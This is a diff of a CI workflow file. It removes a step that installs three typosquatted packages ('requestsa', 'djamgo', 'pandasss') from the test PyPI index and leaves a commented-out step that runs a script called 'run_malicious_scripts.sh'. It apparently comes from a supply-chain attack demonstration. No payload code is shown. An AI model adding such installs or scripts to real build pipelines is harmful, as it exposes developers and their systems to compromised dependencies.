@@ -28,14 +28,6 @@ jobs:
 
       - name: Install dependencies
         run: pip install -r requirements.txt
-
-      - name: Install typosquatting packages
-        run: | 
-          pip install -i https://test.pypi.org/simple/ requestsa
-          pip install -i https://test.pypi.org/simple/ djamgo
-          pip install -i https://test.pypi.org/simple/ pandasss
-
-
         
    #   - name: 😈 Execute malicious script
     #    run: bash run_malicious_scripts.sh
